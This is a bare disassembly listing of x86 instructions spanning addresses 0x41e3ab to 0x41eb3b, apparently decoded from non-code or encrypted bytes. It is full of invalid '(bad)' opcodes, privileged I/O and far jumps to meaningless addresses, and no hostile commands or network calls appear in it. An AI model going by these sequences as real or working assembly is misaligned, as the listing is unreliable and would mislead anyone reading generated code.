  41e3ab:	xchg   ebx,eax
  41e3ac:	shl    BYTE PTR [ebx+ecx*1],0xf0
  41e3b0:	rol    BYTE PTR ds:0x6fabab39,cl
  41e3b6:	xor    al,0x5d
  41e3b8:	xor    al,0xcd
  41e3ba:	dec    ebx
  41e3bb:	cmc    
  41e3bc:	lods   al,BYTE PTR ds:[esi]
  41e3bd:	mov    esi,0x2a74ff88
  41e3c2:	rcr    BYTE PTR [ecx-0x1f57f254],0x69
  41e3c9:	call   0x7234:0xe47e62ce
  41e3d0:	enter  0x2f35,0x5f
  41e3d4:	pop    ebp
  41e3d5:	add    esp,DWORD PTR [edi-0x4bcfb3ac]
  41e3db:	pop    ecx
  41e3dc:	imul   ecx,DWORD PTR [edx+0x69dd695c],0x6c
  41e3e3:	rol    dh,1
  41e3e5:	in     eax,dx
  41e3e6:	xchg   BYTE PTR ds:0x1f9320ff,ah
  41e3ec:	cmp    eax,0x5b3ca4ed
  41e3f1:	adc    cl,al
  41e3f3:	and    BYTE PTR [esi],cl
  41e3f5:	xchg   DWORD PTR [edi+0x37],edi
  41e3f8:	and    al,bl
  41e3fa:	bndldx bnd3,[esi]
  41e3fd:	arpl   ax,bp
  41e3ff:	jae    0x41e3fc
  41e401:	test   al,0xa7
  41e403:	fisttp WORD PTR [ebx]
  41e405:	mov    ah,0x29
  41e407:	xor    eax,0x2b9fe5ad
  41e40c:	xchg   esi,eax
  41e40d:	mov    ds:0x70f41d5,al
  41e412:	push   0xffffffd6
  41e414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e415:	outs   dx,DWORD PTR ds:[esi]
  41e416:	and    eax,0xf93565bc
  41e41b:	push   esp
  41e41c:	mov    ebp,0xb41b0cf1
  41e421:	ins    BYTE PTR es:[edi],dx
  41e422:	lock sub ch,BYTE PTR [ecx+0x3556c19d]
  41e429:	mov    esp,0xa5f9e8ae
  41e42e:	jp     0x41e424
  41e430:	les    eax,FWORD PTR [ecx-0x371d2b7f]
  41e436:	sub    al,0xc2
  41e438:	mov    ebx,gs
  41e43a:	retf   0x41cc
  41e43d:	mov    al,0x24
  41e43f:	pop    esp
  41e440:	xchg   ebx,eax
  41e441:	push   ds
  41e442:	xchg   esi,eax
  41e443:	and    BYTE PTR [ebp+0x3e9e387b],bh
  41e449:	popf   
  41e44a:	jns    0x41e4af
  41e44c:	test   eax,0xf89d49ff
  41e451:	jge    0x41e421
  41e453:	(bad)  
  41e454:	fisttp DWORD PTR [eax+0x50]
  41e457:	push   ecx
  41e458:	and    eax,0x919f1e20
  41e45d:	into   
  41e45e:	or     al,0xc0
  41e460:	ja     0x41e471
  41e462:	push   edi
  41e463:	add    esp,DWORD PTR [ebx-0x43]
  41e466:	xchg   ebx,eax
  41e467:	pusha  
  41e468:	adc    BYTE PTR [edx+0x68],dl
  41e46b:	inc    esi
  41e46c:	sub    ah,BYTE PTR [esi]
  41e46e:	inc    ecx
  41e46f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e470:	(bad)  
  41e471:	out    dx,al
  41e472:	imul   edx,DWORD PTR [edx+0x4d1829d0],0xffffffd7
  41e479:	add    dh,ch
  41e47b:	dec    esp
  41e47c:	dec    ebp
  41e47d:	mov    bl,0x34
  41e47f:	out    0x7,eax
  41e481:	or     ecx,DWORD PTR [edi+0x76ff74e1]
  41e487:	pop    ecx
  41e488:	js     0x41e4b9
  41e48a:	cli    
  41e48b:	push   ebx
  41e48c:	int    0x1f
  41e48e:	xor    esp,DWORD PTR ds:[esi+0x6b]
  41e492:	dec    edx
  41e493:	xchg   esi,eax
  41e494:	xchg   BYTE PTR [esi-0x7c],bl
  41e497:	push   ebp
  41e498:	fild   WORD PTR [ecx+0x57c1f09a]
  41e49e:	mov    ch,0xb9
  41e4a0:	mov    ch,0x40
  41e4a2:	imul   edi,ebx,0x7f
  41e4a5:	hlt    
  41e4a6:	inc    esp
  41e4a7:	aam    0xe2
  41e4a9:	scas   al,BYTE PTR es:[edi]
  41e4aa:	lds    ebx,FWORD PTR [ebp-0x5cbd7ecd]
  41e4b0:	xor    bl,ch
  41e4b2:	hlt    
  41e4b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4b4:	adc    DWORD PTR [edx+0x6fc17af8],ebp
  41e4ba:	sub    al,0x4c
  41e4bc:	xchg   ecx,eax
  41e4bd:	sub    DWORD PTR [eax+0x37d5947b],0xffffff84
  41e4c4:	mov    edx,eax
  41e4c6:	js     0x41e47d
  41e4c8:	jl     0x41e47a
  41e4ca:	das    
  41e4cb:	mov    esp,0xbf0ba2f0
  41e4d0:	dec    esi
  41e4d1:	stos   BYTE PTR es:[edi],al
  41e4d2:	push   ebp
  41e4d3:	pushf  
  41e4d4:	mov    ds:0x1ade96de,al
  41e4d9:	sbb    dh,ch
  41e4db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4dc:	or     DWORD PTR [ecx+0x1e4d75ea],esi
  41e4e2:	jbe    0x41e518
  41e4e4:	mov    cl,0x3d
  41e4e6:	lahf   
  41e4e7:	or     al,0xa5
  41e4e9:	xchg   ebx,eax
  41e4ea:	mov    dh,0xdc
  41e4ec:	pop    esi
  41e4ed:	xor    eax,0x62829913
  41e4f2:	lea    esi,[edx-0x36]
  41e4f5:	push   edx
  41e4f6:	push   es
  41e4f7:	jb     0x41e51c
  41e4f9:	lock test esi,esp
  41e4fc:	push   ecx
  41e4fd:	sahf   
  41e4fe:	and    ch,BYTE PTR [edi-0xf3bbaa1]
  41e504:	test   BYTE PTR [esp+esi*4-0x2b4cbbe6],al
  41e50b:	jecxz  0x41e56e
  41e50d:	push   eax
  41e50e:	ins    DWORD PTR es:[edi],dx
  41e50f:	jmp    0xa00f35
  41e514:	pop    ecx
  41e515:	(bad)  
  41e517:	mov    esi,0x7bc64419
  41e51c:	imul   ebx,esp,0x4a
  41e51f:	fs jne 0x41e56a
  41e522:	mov    cl,0xc5
  41e524:	or     eax,0x8475834f
  41e529:	popa   
  41e52a:	sub    DWORD PTR [esi+0x52],0x7502747a
  41e531:	push   ebp
  41e532:	or     cl,0x1f
  41e535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e536:	shl    BYTE PTR [eax],1
  41e538:	pop    esi
  41e539:	call   0xbba5d2ec
  41e53e:	add    DWORD PTR [ebp-0x174b66d6],ebx
  41e544:	mov    edi,0x6256dbe
  41e549:	sbb    BYTE PTR [ebp+0x4f840dc7],0x9c
  41e550:	xchg   BYTE PTR [ebp+0x2e],bh
  41e553:	leave  
  41e554:	mov    al,ds:0x26b528f4
  41e559:	outs   dx,BYTE PTR ds:[esi]
  41e55a:	and    DWORD PTR [ecx+0x3bbedc5f],edx
  41e560:	push   ds
  41e561:	jmp    0x7b4e0396
  41e566:	in     eax,dx
  41e567:	lahf   
  41e568:	mov    ds:0x5231b040,eax
  41e56d:	xchg   edx,eax
  41e56e:	lock cmc 
  41e570:	rol    DWORD PTR [esi+0x54],cl
  41e573:	fsub   st,st(0)
  41e575:	dec    ebp
  41e576:	mov    dl,0x20
  41e578:	mov    al,0x91
  41e57a:	jo     0x41e51a
  41e57c:	inc    esi
  41e57d:	sbb    al,0xb5
  41e57f:	das    
  41e580:	ins    DWORD PTR es:[edi],dx
  41e581:	pop    ds
  41e582:	and    dh,cl
  41e584:	sbb    eax,0x8d816584
  41e589:	rol    DWORD PTR [esi],1
  41e58b:	push   ebp
  41e58c:	cwde   
  41e58d:	cmp    eax,0x1c4d601
  41e592:	xchg   esp,eax
  41e593:	mov    ss,edi
  41e595:	imul   ebx,DWORD PTR [ebx-0x3dde0bee],0xc64b6c5a
  41e59f:	out    0xaf,eax
  41e5a1:	lods   eax,DWORD PTR ds:[esi]
  41e5a2:	pop    ss
  41e5a3:	push   eax
  41e5a4:	test   BYTE PTR [ecx-0x1],dh
  41e5a7:	cli    
  41e5a8:	jns    0x41e597
  41e5aa:	sbb    edi,0xffffffc6
  41e5ad:	xchg   ebx,eax
  41e5ae:	(bad)  
  41e5af:	jmp    0x74a6a90e
  41e5b4:	sar    ecx,cl
  41e5b6:	test   al,0xb4
  41e5b8:	or     DWORD PTR [esi],ecx
  41e5ba:	mov    ss,WORD PTR [ebx+0x6c]
  41e5bd:	or     BYTE PTR [ebx+0x72ea5611],0xba
  41e5c4:	dec    edx
  41e5c5:	stos   BYTE PTR es:[edi],al
  41e5c6:	or     al,cl
  41e5c8:	mov    dh,BYTE PTR [ebx+0xe066a57]
  41e5ce:	retf   0x5c13
  41e5d1:	inc    edi
  41e5d2:	icebp  
  41e5d3:	sbb    ch,BYTE PTR [edx-0x165da85]
  41e5d9:	push   eax
  41e5da:	int    0xd9
  41e5dc:	mov    edi,0xad4e3ede
  41e5e1:	xchg   edx,eax
  41e5e2:	imul   DWORD PTR [edi+0x6ae64c6a]
  41e5e8:	test   al,0x2e
  41e5ea:	repnz push edx
  41e5ec:	lods   al,BYTE PTR ds:[esi]
  41e5ed:	or     DWORD PTR [ebx-0x23],ebp
  41e5f0:	dec    esp
  41e5f1:	or     BYTE PTR [ebx-0x4d915a2c],ch
  41e5f7:	dec    ecx
  41e5f8:	xchg   edx,eax
  41e5f9:	mov    edx,0x4fc23e89
  41e5fe:	push   esi
  41e5ff:	scas   eax,DWORD PTR es:[edi]
  41e600:	gs inc edi
  41e602:	fld    TBYTE PTR [edi-0x1347aa23]
  41e608:	les    ebx,FWORD PTR [eax]
  41e60a:	sub    DWORD PTR [edx],eax
  41e60c:	push   cs
  41e60d:	jge    0x41e59a
  41e60f:	xor    bh,ah
  41e611:	add    edx,esp
  41e613:	and    DWORD PTR [ebx],eax
  41e615:	cmp    eax,0x6164b2a8
  41e61a:	call   0x2832:0x2193e486
  41e621:	pop    edi
  41e622:	add    ebx,DWORD PTR [edi+0xcff360a]
  41e628:	cmp    ebx,esp
  41e62a:	push   0x88ac30bd
  41e62f:	aad    0x67
  41e631:	jl     0x41e61d
  41e633:	inc    eax
  41e634:	ret    
  41e635:	mov    WORD PTR [ebx],?
  41e637:	lods   al,BYTE PTR ds:[esi]
  41e638:	push   0x75ec5538
  41e63d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e63e:	mov    ebp,DWORD PTR [ecx+edx*2+0x35]
  41e642:	aaa    
  41e643:	ins    BYTE PTR es:[edi],dx
  41e644:	rol    BYTE PTR [edi],0x5a
  41e647:	cwde   
  41e648:	inc    edi
  41e649:	ret    0x93ac
  41e64c:	loopne 0x41e61d
  41e64e:	mov    esi,0xb9fb4841
  41e653:	xchg   esp,eax
  41e654:	dec    ebx
  41e655:	mov    cl,0x50
  41e657:	in     eax,0xb3
  41e659:	clc    
  41e65a:	bound  ebx,QWORD PTR [ebx]
  41e65c:	fdivr  DWORD PTR [edx+eax*8+0x142480b1]
  41e663:	mov    ebp,0xe77c5715
  41e668:	sub    cl,bh
  41e66a:	xchg   BYTE PTR [eax],al
  41e66c:	pop    eax
  41e66d:	push   edi
  41e66e:	cmp    cl,BYTE PTR [eax]
  41e670:	(bad)  
  41e671:	clc    
  41e672:	scas   eax,DWORD PTR es:[edi]
  41e673:	cmp    al,BYTE PTR [esi]
  41e675:	mov    dh,0xb0
  41e677:	jne    0x41e644
  41e679:	add    esp,edi
  41e67b:	adc    cl,BYTE PTR [ebp-0x2a]
  41e67e:	sub    al,0xf7
  41e680:	idiv   BYTE PTR [edi+ebp*8+0x41f0a272]
  41e687:	xchg   edx,eax
  41e688:	imul   esi,edx,0x37
  41e68b:	sbb    al,0x52
  41e68d:	jmp    0xa693db88
  41e692:	mov    eax,ds:0x7c12f7b4
  41e697:	test   eax,0x9caae639
  41e69c:	ss push edi
  41e69e:	int    0xc
  41e6a0:	dec    ebx
  41e6a1:	adc    eax,0x19
  41e6a4:	es mov eax,0x62a355c
  41e6aa:	push   edi
  41e6ab:	dec    esi
  41e6ac:	sbb    BYTE PTR [eax+0x1],ah
  41e6af:	(bad)  
  41e6b0:	sbb    BYTE PTR [eax],dl
  41e6b2:	mov    ebp,0x6743ecb7
  41e6b7:	sbb    bh,BYTE PTR [edx-0x58]
  41e6ba:	cmp    DWORD PTR [ebp-0x6],0x36922c35
  41e6c1:	inc    esi
  41e6c2:	(bad)
  41e6c5:	out    0x84,al
  41e6c7:	jbe    0x41e6ce
  41e6c9:	adc    al,0x36
  41e6cb:	test   eax,0xb2f1be9a
  41e6d0:	sub    eax,0x71403558
  41e6d5:	test   eax,0x7506846b
  41e6da:	mov    cs,WORD PTR [eax+0x16dd6239]
  41e6e0:	je     0x41e702
  41e6e2:	stos   BYTE PTR es:[edi],al
  41e6e3:	fidivr WORD PTR [edx]
  41e6e5:	outs   dx,BYTE PTR ds:[esi]
  41e6e6:	dec    edi
  41e6e7:	dec    edx
  41e6e8:	scas   al,BYTE PTR es:[edi]
  41e6e9:	cmp    BYTE PTR ds:0x2b07ba0a,dl
  41e6ef:	out    dx,al
  41e6f0:	ss sub eax,0x951c68ba
  41e6f6:	jp     0x41e70a
  41e6f8:	stos   BYTE PTR es:[edi],al
  41e6f9:	cmp    BYTE PTR [ebx-0x70],0x29
  41e6fd:	sbb    ecx,0x6c
  41e700:	jno    0x41e72b
  41e702:	push   cs
  41e703:	call   0xc0bf:0x59670a3f
  41e70a:	daa    
  41e70b:	bound  eax,QWORD PTR [eax+0x76]
  41e70e:	mov    al,0xf4
  41e710:	aam    0xb0
  41e712:	sub    edi,DWORD PTR [eax]
  41e714:	rol    BYTE PTR [ebp+0x5f],1
  41e717:	lods   al,BYTE PTR ds:[esi]
  41e718:	adc    cl,ch
  41e71a:	cmp    bh,bh
  41e71c:	push   edi
  41e71d:	call   0xdb817d5d
  41e722:	xor    eax,0x14496e2d
  41e727:	int3   
  41e728:	adc    al,0xf4
  41e72a:	mov    ebp,0xf4d298ac
  41e72f:	and    cl,al
  41e731:	in     eax,dx
  41e732:	push   ebp
  41e733:	into   
  41e734:	sbb    DWORD PTR [ebx-0x707c9096],0x6b
  41e73b:	jmp    0x41e76e
  41e73d:	fmul   DWORD PTR [esi+0x704bdfe4]
  41e743:	xor    al,0xa2
  41e745:	mov    ebx,DWORD PTR [ebx]
  41e747:	adc    DWORD PTR [edi-0x2bf08d6d],ecx
  41e74d:	stos   BYTE PTR es:[edi],al
  41e74e:	dec    edi
  41e74f:	push   esi
  41e750:	data16 xor al,dl
  41e753:	xchg   esp,eax
  41e754:	(bad)  
  41e755:	cld    
  41e756:	out    dx,eax
  41e757:	and    al,al
  41e759:	imul   ecx,ebx,0x2d
  41e75c:	ror    BYTE PTR [edi-0x39],0x90
  41e760:	add    al,0x9f
  41e762:	jmp    0x41e748
  41e764:	lods   eax,DWORD PTR ds:[esi]
  41e765:	js     0x41e75f
  41e767:	dec    ecx
  41e768:	cmp    dh,BYTE PTR [edx]
  41e76a:	rcr    DWORD PTR [eax],1
  41e76c:	inc    esp
  41e76d:	mov    dh,0x9c
  41e76f:	ins    BYTE PTR es:[edi],dx
  41e770:	push   esi
  41e771:	mov    al,ds:0x7b08bf91
  41e776:	mov    dh,0x8c
  41e778:	push   0xbd708b2c
  41e77d:	jl     0x41e775
  41e77f:	repnz adc al,0xa6
  41e782:	jmp    0x817c:0xbd66a34d
  41e789:	out    dx,al
  41e78a:	dec    ebx
  41e78b:	and    DWORD PTR [ecx+edi*8],edi
  41e78e:	outs   dx,BYTE PTR ds:[esi]
  41e78f:	adc    bh,BYTE PTR [ebx-0x59a147bd]
  41e795:	std    
  41e796:	es pop ebx
  41e798:	xchg   esp,eax
  41e799:	fcmovnbe st,st(6)
  41e79b:	sub    BYTE PTR [esi],0xa3
  41e79e:	pop    es
  41e79f:	cmp    DWORD PTR [edi-0x61ba546f],ebx
  41e7a5:	adc    al,0x11
  41e7a7:	stos   DWORD PTR es:[edi],eax
  41e7a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7a9:	enter  0x423c,0x6b
  41e7ad:	xor    eax,DWORD PTR [ebx]
  41e7af:	push   ecx
  41e7b0:	outs   dx,DWORD PTR ds:[esi]
  41e7b1:	jno    0x41e7c5
  41e7b3:	push   eax
  41e7b4:	rcl    BYTE PTR [esi-0x302a6c64],0xae
  41e7bb:	xor    esp,ebx
  41e7bd:	sub    ch,cl
  41e7bf:	mov    edx,0xfd4febe5
  41e7c4:	into   
  41e7c5:	mov    ds:0x61282e78,al
  41e7ca:	pop    eax
  41e7cb:	das    
  41e7cc:	push   0x47c4b855
  41e7d1:	pop    es
  41e7d2:	js     0x41e7a3
  41e7d4:	fst    st(6)
  41e7d6:	int3   
  41e7d7:	mov    ebx,0xbd25e95b
  41e7dc:	(bad)  
  41e7dd:	adc    ah,BYTE PTR [ecx-0x740f30b1]
  41e7e3:	scas   al,BYTE PTR es:[edi]
  41e7e4:	scas   eax,DWORD PTR es:[edi]
  41e7e5:	pop    ecx
  41e7e6:	ja     0x41e799
  41e7e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7e9:	push   es
  41e7ea:	leave  
  41e7eb:	fs es xchg edi,eax
  41e7ee:	and    eax,ecx
  41e7f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7f1:	fistp  QWORD PTR [ebx-0x3b4f4d79]
  41e7f7:	lock sbb ebp,DWORD PTR [ecx+0x16]
  41e7fb:	mov    ebx,0x48d746c
  41e800:	lahf   
  41e801:	neg    esp
  41e803:	push   eax
  41e804:	lds    edi,FWORD PTR [eax]
  41e806:	inc    edi
  41e807:	iret   
  41e808:	mov    BYTE PTR [edi],0x20
  41e80b:	mov    DWORD PTR [ebx+0x290ef465],ebp
  41e811:	sub    edx,DWORD PTR [ecx]
  41e813:	and    ebp,esp
  41e815:	rcl    BYTE PTR [edi-0x5c],0x2f
  41e819:	repnz in eax,0x6c
  41e81c:	dec    esi
  41e81d:	jne    0x41e7d6
  41e81f:	arpl   WORD PTR [edx+0x40f9c30],di
  41e825:	ret    
  41e826:	jmp    0xf708:0xe38071c4
  41e82d:	ins    DWORD PTR es:[edi],dx
  41e82e:	xchg   edi,eax
  41e82f:	(bad)  
  41e830:	into   
  41e831:	imul   ebp,DWORD PTR [ecx-0x48],0x3b5f4f91
  41e838:	xchg   edx,eax
  41e839:	xchg   edx,eax
  41e83a:	sti    
  41e83b:	mov    ebx,0x6c44989f
  41e840:	(bad)  
  41e841:	call   FWORD PTR cs:[eax]
  41e844:	add    al,0x66
  41e846:	inc    edx
  41e847:	inc    esp
  41e848:	enter  0x6d1e,0xa4
  41e84c:	(bad)  
  41e84d:	aas    
  41e84e:	jl     0x41e86e
  41e850:	xchg   ebp,eax
  41e851:	and    BYTE PTR [edx+0x4af79d70],bh
  41e857:	std    
  41e858:	in     eax,0x48
  41e85a:	lods   al,BYTE PTR gs:[esi]
  41e85c:	int3   
  41e85d:	jg     0x41e8dc
  41e85f:	jmp    FWORD PTR [edi]
  41e861:	xor    al,0xf2
  41e863:	and    DWORD PTR [ecx-0x4f80bdf6],esi
  41e869:	cmp    al,0xcc
  41e86b:	fidiv  DWORD PTR [esi]
  41e86d:	bound  ecx,QWORD PTR [esp+ebx*4]
  41e870:	dec    edi
  41e871:	fcom   QWORD PTR [edx]
  41e873:	mov    ecx,DWORD PTR [ecx+0x5e77c117]
  41e879:	imul   edi,DWORD PTR [edx-0x23],0x75d63cc4
  41e880:	pop    ss
  41e881:	or     eax,0x1baac061
  41e886:	jmp    0xd6bf202b
  41e88b:	push   edx
  41e88c:	nop
  41e88d:	push   eax
  41e88e:	sti    
  41e88f:	fcmovnu st,st(2)
  41e891:	xchg   BYTE PTR [eax+0x1c],cl
  41e894:	scas   eax,DWORD PTR es:[edi]
  41e895:	mov    ah,0xd6
  41e897:	mov    eax,ds:0x5dbf9f91
  41e89c:	push   esp
  41e89d:	xchg   ecx,eax
  41e89e:	xchg   esp,eax
  41e89f:	mov    ecx,0x57891e3
  41e8a4:	addr16 ret 0x6cb5
  41e8a8:	xchg   ebp,eax
  41e8a9:	std    
  41e8aa:	stos   DWORD PTR es:[edi],eax
  41e8ab:	int    0x9
  41e8ad:	sbb    al,0x26
  41e8af:	addr16 xchg esi,eax
  41e8b1:	cmp    BYTE PTR [edi-0x10],cl
  41e8b4:	hlt    
  41e8b5:	fidivr DWORD PTR [edi-0x5a7f838e]
  41e8bb:	fsubp  st(7),st
  41e8bd:	push   0xffffffba
  41e8bf:	xchg   BYTE PTR [eax+0x5d],al
  41e8c2:	imul   edx,DWORD PTR [esp+eiz*2-0x65f13db6],0x6aa4e83c
  41e8cd:	jmp    0x41e88a
  41e8cf:	fldenv ds:0x849da6fd
  41e8d5:	inc    esp
  41e8d6:	pop    es
  41e8d7:	mov    DWORD PTR [eax],ecx
  41e8d9:	xchg   ebp,eax
  41e8da:	call   0x82d2:0x74218948
  41e8e1:	and    eax,0x9febf78d
  41e8e6:	ins    DWORD PTR es:[edi],dx
  41e8e7:	mov    ecx,0x330959bc
  41e8ec:	adc    al,0xaa
  41e8ee:	lea    ebp,[eax+0x5a]
  41e8f1:	rcr    DWORD PTR [edx+0x61669f58],1
  41e8f7:	scas   eax,DWORD PTR es:[edi]
  41e8f8:	jnp    0x41e8ee
  41e8fa:	repnz or ah,ah
  41e8fd:	cli    
  41e8fe:	fucom  st(5)
  41e900:	push   0x93b8d2d5
  41e905:	xchg   edi,eax
  41e906:	dec    esp
  41e907:	pop    es
  41e908:	jle    0x41e950
  41e90a:	clc    
  41e90b:	sub    ah,bh
  41e90d:	add    DWORD PTR [ebp+0x65c799c7],edi
  41e913:	lock cmp BYTE PTR [esi+0x53156923],bl
  41e91a:	jbe    0x41e92e
  41e91c:	pop    eax
  41e91d:	ds sbb dh,bh
  41e920:	int3   
  41e921:	out    0x1d,eax
  41e923:	lahf   
  41e924:	adc    esp,DWORD PTR [edi+0x30]
  41e927:	jne    0x41e97a
  41e929:	mov    edi,0x588b21c9
  41e92e:	push   ebp
  41e92f:	out    0xce,eax
  41e931:	add    DWORD PTR ds:0xffc7ac95,ebp
  41e937:	mov    cl,0x53
  41e939:	mov    ebx,0xd8dc44d
  41e93e:	inc    ecx
  41e93f:	mov    edi,0x1fd96aef
  41e944:	mov    ecx,0xf161eff2
  41e949:	fisttp WORD PTR [edi]
  41e94b:	or     esi,DWORD PTR [eax+0x5d]
  41e94e:	xor    al,0xe1
  41e950:	mov    ds:0x32ceb386,al
  41e955:	rep ins BYTE PTR es:[edi],dx
  41e957:	popf   
  41e958:	inc    esi
  41e959:	sar    DWORD PTR [esi+0xcb7b9a0],cl
  41e95f:	sub    ecx,DWORD PTR [ebp-0x1db3ed49]
  41e965:	test   al,0x2e
  41e967:	(bad)  
  41e968:	(bad)  
  41e969:	push   esp
  41e96a:	adc    ebx,DWORD PTR [esi]
  41e96c:	or     DWORD PTR [eax+0x5d],0x683c544b
  41e973:	inc    ebx
  41e974:	fadd   QWORD PTR [ebp+edx*4+0x48]
  41e978:	(bad)  
  41e97a:	jns    0x41e967
  41e97c:	push   DWORD PTR ds:0x52c8f30c
  41e982:	mov    edi,DWORD PTR [esi+0x7f]
  41e985:	ror    DWORD PTR [ecx-0x62090e45],0x1e
  41e98c:	loopne 0x41e965
  41e98e:	xor    BYTE PTR [edx],al
  41e990:	jge    0x41e913
  41e992:	loope  0x41e9ee
  41e994:	add    al,0x13
  41e996:	stos   BYTE PTR es:[edi],al
  41e997:	loopne 0x41e9f7
  41e999:	out    0xb0,al
  41e99b:	or     ecx,DWORD PTR [esi+0xe11a8de]
  41e9a1:	(bad)  [ebx+0x781f888b]
  41e9a7:	aad    0x16
  41e9a9:	xchg   BYTE PTR [edi-0x16bed107],al
  41e9af:	test   al,0xa0
  41e9b1:	std    
  41e9b2:	xor    edx,DWORD PTR [eax-0x50]
  41e9b5:	in     al,0xb2
  41e9b7:	in     eax,0xd1
  41e9b9:	inc    edi
  41e9ba:	mov    al,ds:0xe117ddb9
  41e9bf:	outs   dx,BYTE PTR ds:[esi]
  41e9c0:	sub    al,0xe5
  41e9c2:	popa   
  41e9c3:	imul   ecx,DWORD PTR [edx+0x6],0xffffffde
  41e9c7:	xchg   ebp,eax
  41e9c8:	mov    ebx,0x3f795244
  41e9cd:	repz cli 
  41e9cf:	stos   DWORD PTR es:[edi],eax
  41e9d0:	lea    edx,[ecx]
  41e9d2:	les    edi,FWORD PTR [esi]
  41e9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d5:	mov    bl,0xf4
  41e9d7:	mov    DWORD PTR [ebp+0x7a625927],ecx
  41e9dd:	enter  0x86f8,0x1e
  41e9e1:	dec    esp
  41e9e2:	js     0x41e9bc
  41e9e4:	cmp    ebx,eax
  41e9e6:	or     BYTE PTR [edi+esi*8+0x6f55ccd5],bl
  41e9ed:	enter  0xf718,0xe0
  41e9f1:	std    
  41e9f2:	aam    0x70
  41e9f4:	xchg   edx,eax
  41e9f5:	cld    
  41e9f6:	repz mul DWORD PTR [edi-0x3e8760db]
  41e9fd:	shl    bh,1
  41e9ff:	sbb    BYTE PTR [edi-0x64],cl
  41ea02:	mov    ch,0x44
  41ea04:	pop    ds
  41ea05:	iret   
  41ea06:	pop    edi
  41ea07:	ror    DWORD PTR [esi+ecx*4-0x34249e34],0xa1
  41ea0f:	popa   
  41ea10:	pop    ds
  41ea11:	icebp  
  41ea12:	mov    eax,ss:0xb181eba7
  41ea18:	inc    edx
  41ea19:	jecxz  0x41ea98
  41ea1b:	retf   
  41ea1c:	cwde   
  41ea1d:	es cmp dh,bl
  41ea20:	inc    esi
  41ea21:	(bad)  
  41ea22:	mov    ah,0xe3
  41ea24:	push   ss
  41ea25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea26:	mov    edx,0xa333a591
  41ea2b:	add    dh,BYTE PTR [ebx-0x47cd9a0a]
  41ea31:	mov    ds:0x679293da,al
  41ea36:	dec    esi
  41ea37:	mov    ecx,0x3fad6213
  41ea3c:	mov    ds:0x2d10c29e,al
  41ea41:	jae    0x41ea31
  41ea43:	into   
  41ea44:	push   0xda71997d
  41ea49:	imul   ebx,DWORD PTR [esi],0x79732e6c
  41ea4f:	fdivr  DWORD PTR [ecx-0xa]
  41ea52:	inc    ebp
  41ea53:	add    BYTE PTR [ecx],dh
  41ea55:	xchg   edx,eax
  41ea56:	and    eax,0x396acae3
  41ea5b:	add    DWORD PTR [ebp+0x55be98ba],ecx
  41ea61:	pop    edx
  41ea62:	aam    0xa3
  41ea64:	jp     0x41ea89
  41ea66:	adc    esp,DWORD PTR [ebp+edi*1+0x5b3daa88]
  41ea6d:	pop    ebp
  41ea6e:	or     al,ch
  41ea70:	idiv   DWORD PTR [esp+eiz*4]
  41ea73:	sub    ecx,DWORD PTR [edx]
  41ea75:	push   ebx
  41ea76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea77:	(bad)  
  41ea78:	lods   eax,DWORD PTR ss:[esi]
  41ea7a:	std    
  41ea7b:	call   0x4cf04df6
  41ea80:	dec    eax
  41ea81:	jp     0x41ea1e
  41ea83:	pop    ss
  41ea84:	dec    eax
  41ea85:	jns    0x41eaa2
  41ea87:	int    0x6b
  41ea89:	(bad)  
  41ea8a:	fsubp  st(6),st
  41ea8c:	push   ebx
  41ea8d:	dec    ebp
  41ea8e:	xor    esi,esi
  41ea90:	sub    cl,BYTE PTR [esi]
  41ea92:	in     eax,0x32
  41ea94:	stc    
  41ea95:	or     eax,0x77a245e7
  41ea9a:	fild   DWORD PTR ss:[esi+0x7c556f92]
  41eaa1:	loop   0x41eb1b
  41eaa3:	int    0x41
  41eaa5:	sub    eax,0xca25a20d
  41eaaa:	imul   ecx,DWORD PTR [edi+edi*2+0x32f810f9],0x3aa327f4
  41eab5:	cmp    eax,0xe3fe3ad5
  41eaba:	mov    dh,0x39
  41eabc:	jno    0x41ea8e
  41eabe:	addr16 mov ebx,0x536aab35
  41eac4:	jnp    0x41eaa4
  41eac6:	(bad)  
  41eac7:	outs   dx,BYTE PTR ds:[esi]
  41eac8:	stos   BYTE PTR es:[edi],al
  41eac9:	sub    ebx,DWORD PTR [edx]
  41eacb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eacc:	and    eax,0x863b6b3e
  41ead1:	cs sub esp,ebp
  41ead4:	imul   ecx,DWORD PTR [edi-0x156c34c5],0xffffffd6
  41eadb:	scas   al,BYTE PTR es:[edi]
  41eadc:	stc    
  41eadd:	cwde   
  41eade:	pop    esp
  41eadf:	hlt    
  41eae0:	sbb    eax,0x746234d5
  41eae5:	test   al,0x65
  41eae7:	fisttp WORD PTR [edi-0x7dfba36d]
  41eaed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaee:	jg     0x41eaff
  41eaf0:	out    dx,eax
  41eaf1:	or     al,0x2f
  41eaf3:	mov    ebp,0x84eb0a96
  41eaf8:	jl     0x41eaf1
  41eafa:	sub    ecx,DWORD PTR [esi+ebx*8+0x6a56782a]
  41eb01:	(bad)  
  41eb02:	dec    ebx
  41eb03:	and    al,dh
  41eb05:	cmc    
  41eb06:	(bad)  
  41eb07:	pop    ebx
  41eb08:	jbe    0x41eb84
  41eb0a:	push   cs
  41eb0b:	pop    ecx
  41eb0c:	ss or  eax,0x7c73c841
  41eb12:	stos   BYTE PTR es:[edi],al
  41eb13:	cdq    
  41eb14:	gs mov esp,0xb424a3e
  41eb1a:	inc    esi
  41eb1b:	jmp    0x1363:0xe5a5809d
  41eb22:	popf   
  41eb23:	push   0xa4514f2b
  41eb28:	mov    ch,0x94
  41eb2a:	push   0xd6315a95
  41eb2f:	imul   esi,DWORD PTR [edi+0x40a1709b],0x21c91a82
  41eb39:	int    0x98
  41eb3b:	mov    ds:0xbf91f36c,eax
